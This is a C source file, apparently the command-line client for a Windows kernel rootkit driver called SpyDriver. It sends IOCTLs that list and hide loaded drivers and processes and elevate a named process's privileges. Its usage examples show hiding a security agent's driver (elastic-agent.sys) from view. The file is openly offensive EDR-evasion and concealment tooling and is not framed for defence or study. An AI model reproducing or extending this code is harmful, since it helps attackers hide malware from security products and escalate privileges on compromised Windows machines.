#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Define IOCTL codes
#define IOCTL_SPY_CALLBACK    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2050, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_PATCH       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2051, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_DLIST       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2052, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_DHIDE       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2053, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_PLIST       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2054, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_PHIDE       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2055, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_UPDATE     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2056, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define DRIVER_LINK L"\\\\.\\SpyDriverLink"
#define BUFFER_SIZE 65536  // 64 KB

// Input structure for hide command (must match driver)
typedef struct _SPY_HIDE_INPUT {
    char g_Name[256];
} SPY_HIDE_INPUT;

BOOL SendIOCTL(DWORD ioctlCode, PVOID inputBuffer, DWORD inputSize, PVOID outputBuffer, DWORD outputSize)
{
    HANDLE hDevice = CreateFileW(DRIVER_LINK, GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        printf("[!] Failed to open driver. Error: %lu\n", err);
        if (err == ERROR_ACCESS_DENIED) {
            printf("[!] Run as Administrator\n");
        }
        else if (err == ERROR_FILE_NOT_FOUND) {
            printf("[!] Driver not loaded. Run: sc start SpyDriver\n");
        }
        return FALSE;
    }

    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(hDevice, ioctlCode, inputBuffer, inputSize,
        outputBuffer, outputSize, &bytesReturned, NULL);

    if (result) {
        if (bytesReturned > 0 && outputBuffer != NULL) {
            printf("%.*s", (int)bytesReturned, (char*)outputBuffer);
        }
    }
    else {
        printf("[!] IOCTL failed. Error: %lu\n", GetLastError());
    }

    CloseHandle(hDevice);
    return result;
}

void Art() {
    printf("\n");
    printf("_________             ________        .__                     _________ .__  .__               __\n");
    printf("/   _____/_____ ___.__.\\______ \\_______|__|__  __ ___________  \\_   ___ \|  | |__| ____   _____/  |_\n");
    printf("\\_____  \\\\____ <   |  | |    |  \\_  __ \\  \\  \\/ // __ \\_  __ \\ /    \\  \\/|  | |  |/ __ \\ /    \\   __\n");
    printf("/        \\  |_> >___  | |    `   \\  | \\/  |\\   /\\  ___/|  | \\/ \\     \\___|  |_|  \\  ___/|   |  \\  |\n");
    printf("/_______  /   __// ____|/_______  /__|  |__| \\_/  \\___  >__|     \\______  /____/__|\\___  >___|  /__|\n");
    printf("        \\/|__|   \\/             \\/                    \\/                \\/             \\/     \\/\n");
    printf("    @byIppY0kai\n");
    printf("\n");

}
void PrintUsage(const char* progName)
{
    printf("Usage: %s <category> <action> [options]\n\n", progName);
}

int HandleDriverCommand(int argc, char* argv[], char* buffer)
{   
   
    if (argc < 3) {
        printf("[!] Missing action for driver category\n");
        printf("Usage: %s driver --list|--hide|--callback\n", argv[0]);
        return 1;
    }

    const char* action = argv[2];

    // Action: --list
    if (strcmp(action, "--list") == 0) {
        printf("[*] Listing all loaded kernel drivers...\n\n");
        SendIOCTL(IOCTL_SPY_DLIST, NULL, 0, buffer, BUFFER_SIZE);
        return 0;
    }
    // Action: --hide <driver.sys>
    else if (strcmp(action, "--hide") == 0) {
        if (argc < 4) {
            printf("[!] Missing driver name\n");
            printf("Usage: %s driver --hide <driver.sys>\n", argv[0]);
            printf("Example: %s driver --hide elastic-agent.sys\n", argv[0]);
            return 1;
        }

        const char* driverName = argv[3];
        /*printf("[*] Hiding driver: %s\n\n", driverName);*/

        // Prepare input structure
        SPY_HIDE_INPUT input = { 0 };
        strncpy_s(input.g_Name, sizeof(input.g_Name), driverName, _TRUNCATE);

        // Copy input to start of buffer, output will overwrite
        memcpy(buffer, &input, sizeof(input));
        SendIOCTL(IOCTL_SPY_DHIDE, buffer, sizeof(input), buffer, BUFFER_SIZE);
        return 0;
    }
    // Action: --callback
    else if (strcmp(action, "--callback") == 0) {
        printf("[*] Enumerating kernel callbacks...\n\n");
        printf("[!] Not yet implemented\n");
        // TODO: SendIOCTL(IOCTL_SPY_CALLBACK, NULL, 0, buffer, BUFFER_SIZE);
        return 0;
    }
    // Unknown action
    else {
        printf("[!] Unknown driver action: %s\n", action);
        printf("Valid actions: --list, --hide, --callback\n");
        return 1;
    }
}

int HandleProcessCommand(int argc, char* argv[], char* buffer)
{
    if (argc < 3) {
        printf("[!] Missing action for process category\n");
        printf("Usage: %s process --list|--hide|--kill|--elevate|--ppl\n", argv[0]);
        return 1;
    }

    const char* action = argv[2];

    
    /*printf("Planned actions:\n");
    printf("  --list                      - List all processes\n");
    printf("  --hide <pid>                - Hide process from task manager\n");
    printf("  --kill <pid>                - Terminate process\n");
    printf("  --elevate <pid>             - Elevate process privileges\n");
    printf("  --ppl <pid> [-l <level>]    - Make me a PPL process & level default to the max level");
    printf("\n");*/

    // Action --list
    if (strcmp(action, "--list") == 0) {
        SendIOCTL(IOCTL_SPY_PLIST, NULL, 0, buffer, BUFFER_SIZE);
        return 0;
    }
    // Action: --hide <process.exe>
    else if (strcmp(action, "--hide") == 0) {
        if (argc < 4) {
            printf("[!] Missing driver name\n");
            printf("Usage: %s process --hide <process.exe>\n", argv[0]);
            printf("Example: %s process --hide notepad.exe\n", argv[0]);
            return 1;
        }

        const char* processName = argv[3];
        /*printf("[*] Hiding process: %s\n\n", processName);*/

        // Prepare input structure
        SPY_HIDE_INPUT input = { 0 };
        strncpy_s(input.g_Name, sizeof(input.g_Name), processName, _TRUNCATE);

        // Copy input to start of buffer, output will overwrite
        memcpy(buffer, &input, sizeof(input));
        SendIOCTL(IOCTL_SPY_PHIDE, buffer, sizeof(input), buffer, BUFFER_SIZE);
        return 0;
    }

    // Action: --elevate <process.exe>
    else if (strcmp(action, "--elevate") == 0) {
        if (argc < 4) {
            printf("[!] Missing process name\n");
            printf("Usage: %s process --elevate <process.exe>\n", argv[0]);
            printf("Example: %s process --elevate cmd.exe\n", argv[0]);
            return 1;
        }

        const char* processName = argv[3];

        SPY_HIDE_INPUT input = { 0 };
        strncpy_s(input.g_Name, sizeof(input.g_Name), processName, _TRUNCATE);

        memcpy(buffer, &input, sizeof(input));
        SendIOCTL(IOCTL_SPY_UPDATE, buffer, sizeof(input), buffer, BUFFER_SIZE);
        return 0;
    }
    
    return 0;
}

int main(int argc, char* argv[])
{
    if (argc < 2) {
        PrintUsage(argv[0]);
        return 1;
    }
    
	Art();
    // Allocate buffer
    char* buffer = (char*)malloc(BUFFER_SIZE);
    if (!buffer) {
        printf("[!] Failed to allocate buffer\n");
        return 1;
    }
    ZeroMemory(buffer, BUFFER_SIZE);

    const char* category = argv[1];
    int result = 0;

    // Category: driver
    if (strcmp(category, "driver") == 0) {
        result = HandleDriverCommand(argc, argv, buffer);
    }
    // Category: process
    else if (strcmp(category, "process") == 0) {
        result = HandleProcessCommand(argc, argv, buffer);
    }
    // Unknown category
    else {
        printf("[!] Unknown category: %s\n", category);
        PrintUsage(argv[0]);
        result = 1;
    }
    printf("\n");
    free(buffer);
    return result;
}